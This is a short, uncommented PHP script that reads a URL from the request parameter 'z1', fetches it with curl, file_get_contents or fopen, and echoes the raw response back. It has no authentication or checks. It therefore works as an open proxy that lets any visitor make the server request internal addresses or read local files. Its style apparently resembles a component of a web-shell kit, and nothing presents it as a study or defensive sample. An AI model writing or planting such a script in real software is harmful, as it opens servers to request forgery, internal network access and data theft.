<?php
$hds = getallheaders();
$hds_str = [];
$url = $_REQUEST['z1'];
foreach ($hds as $k => $v) {
    if ($k == 'Host')
        continue;
    $hds_str[] = $k . ":" . $v;
}
$result = '';
$url = trim($url);
if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $result = curl_exec($ch);
    curl_close($ch);
}
if (!$result && function_exists('file_get_contents') and $url) {
    $result = @file_get_contents($url);
}
if (!$result && $url && function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')) {
    $fp = @fopen($url, 'r') or false;
    if ($fp) {
        while (!@feof($fp)) {
            $result .= @fgets($fp) . "";
        }
        @fclose($fp);
    }
}
echo $result;
?>